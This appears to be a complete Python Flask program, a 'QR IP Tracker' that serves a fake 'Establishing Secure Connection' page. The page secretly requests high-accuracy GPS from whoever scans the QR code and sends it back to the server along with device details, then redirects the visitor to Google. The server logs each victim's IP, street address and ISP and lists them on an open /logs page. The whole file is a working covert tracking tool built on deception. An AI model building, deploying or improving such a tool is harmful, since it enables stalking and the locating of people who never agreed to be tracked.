from flask import Flask, request, redirect, render_template_string
import os
import urllib.request
import json
from datetime import datetime

app = Flask(__name__)

LOG_FILE = "captured_ips.txt"

# Ensure log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("=== QR IP Tracker Logs ===\n\n")

# HTML page that secretly captures GPS location via browser API
# Works on BOTH WiFi and Mobile Data because it uses phone GPS, not IP lookup
TRACKER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 360px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h2 { color: #333; margin-bottom: 10px; font-size: 20px; }
        p { color: #666; font-size: 14px; line-height: 1.5; }
        .dots::after {
            content: '.';
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h2>Establishing Secure Connection</h2>
        <p>Please wait while we verify your connection<span class="dots"></span></p>
    </div>
    <script>
        // Function to send captured data back to server
        function sendData(lat, lon, accuracy, source, errorMsg) {
            var params = new URLSearchParams();
            params.append('lat', lat);
            params.append('lon', lon);
            params.append('acc', accuracy);
            params.append('src', source);
            params.append('err', errorMsg || '');
            params.append('ua', navigator.userAgent);
            params.append('platform', navigator.platform);
            params.append('lang', navigator.language);
            params.append('screen', screen.width + 'x' + screen.height);

            fetch('/collect?' + params.toString(), { method: 'GET', keepalive: true })
                .then(function() {
                    window.location.href = 'https://www.google.com';
                })
                .catch(function() {
                    window.location.href = 'https://www.google.com';
                });
        }

        // Try to get GPS location from browser (works on WiFi AND mobile data)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    sendData(
                        position.coords.latitude,
                        position.coords.longitude,
                        position.coords.accuracy,
                        'gps',
                        'none'
                    );
                },
                function(error) {
                    var errMsg = 'GPS_DENIED';
                    if (error.code === 1) errMsg = 'PERMISSION_DENIED';
                    else if (error.code === 2) errMsg = 'POSITION_UNAVAILABLE';
                    else if (error.code === 3) errMsg = 'TIMEOUT';
                    sendData('N/A', 'N/A', '0', 'gps_failed', errMsg);
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        } else {
            sendData('N/A', 'N/A', '0', 'no_gps_api', 'BROWSER_UNSUPPORTED');
        }
    </script>
</body>
</html>
"""

@app.route("/track")
def track():
    return render_template_string(TRACKER_HTML)

@app.route("/collect")
def collect():
    # Get IP
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    # Get GPS data from browser
    lat = request.args.get('lat', 'N/A')
    lon = request.args.get('lon', 'N/A')
    acc = request.args.get('acc', 'N/A')
    src = request.args.get('src', 'unknown')
    err = request.args.get('err', '')
    ua = request.args.get('ua', request.headers.get("User-Agent", "Unknown"))
    platform = request.args.get('platform', 'Unknown')
    lang = request.args.get('lang', 'Unknown')
    screen = request.args.get('screen', 'Unknown')
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Try to get address from GPS coordinates using OpenStreetMap (free)
    address = "N/A"
    if lat not in ['N/A', 'denied', 'unsupported', ''] and lon not in ['N/A', 'denied', 'unsupported', '']:
        try:
            url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&zoom=18&addressdetails=1"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (QRTracker)'})
            with urllib.request.urlopen(req, timeout=5) as response:
                data = json.loads(response.read().decode())
                address = data.get('display_name', 'N/A')
        except Exception as e:
            address = f"Error: {str(e)}"

    # IP-based geolocation as fallback
    ip_info = get_ip_info(ip)

    # Build log
    log_line = f"[{ts}] IP: {ip} | GPS_Source: {src} | Lat: {lat} | Lon: {lon} | Accuracy: {acc}m | Address: {address} | IP_Country: {ip_info['country']} | IP_City: {ip_info['city']} | ISP: {ip_info['isp']} | Platform: {platform} | Lang: {lang} | Screen: {screen} | UA: {ua}"

    # Console output
    print("=" * 75)
    print("[+] NEW SCAN DETECTED!")
    print(f"[+] IP Address   : {ip}")
    print(f"[+] GPS Source   : {src}")
    print(f"[+] Latitude     : {lat}")
    print(f"[+] Longitude    : {lon}")
    print(f"[+] Accuracy     : {acc} meters")
    print(f"[+] Address      : {address}")
    print(f"[+] IP Country   : {ip_info['country']}")
    print(f"[+] IP City      : {ip_info['city']}")
    print(f"[+] ISP          : {ip_info['isp']}")
    print(f"[+] Platform     : {platform}")
    print(f"[+] Language     : {lang}")
    print(f"[+] Screen       : {screen}")
    print(f"[+] User-Agent   : {ua}")
    print(f"[+] Timestamp    : {ts}")
    if err:
        print(f"[+] GPS Error    : {err}")
    print("=" * 75)

    # Save to file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line + "\n")
        f.write(f"    GPS Coords: {lat},{lon} (accuracy: {acc}m)\n")
        f.write(f"    Address: {address}\n")
        f.write(f"    IP Location: {ip_info['city']}, {ip_info['country']} | ISP: {ip_info['isp']}\n")
        f.write(f"    Device: {platform} | Lang: {lang} | Screen: {screen}\n")
        if err:
            f.write(f"    GPS Error: {err}\n")
        f.write("-" * 75 + "\n")

    return "OK"

def get_ip_info(ip):
    """Get IP geolocation as fallback"""
    try:
        if ":" in ip:
            ip = ip.split(":")[0]
        if ip.startswith(("192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "127.", "::1", "fc00", "fe80")):
            return {"country": "Local/Private", "city": "Local Network", "regionName": "N/A", "isp": "Local/WiFi"}

        # Try ip-api.com first
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,regionName,isp"
        with urllib.request.urlopen(url, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "regionName": data.get("regionName", "Unknown"),
                    "isp": data.get("isp", "Unknown")
                }
    except Exception:
        pass

    return {"country": "Unknown", "city": "Unknown", "regionName": "Unknown", "isp": "Unknown"}

@app.route("/logs")
def show_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            logs = f.read()
        return f"<pre style='font-size:13px;white-space:pre-wrap'>{logs}</pre>"
    except FileNotFoundError:
        return "<p>No logs yet.</p>"

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("[*] QR IP Tracker Server v3 - GPS + IP Location")
    print("[*] This version captures GPS from the browser!")
    print("[*] Works on BOTH WiFi and Mobile Data")
    print("[*] Press CTRL+C to stop.")
    print("=" * 60 + "\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
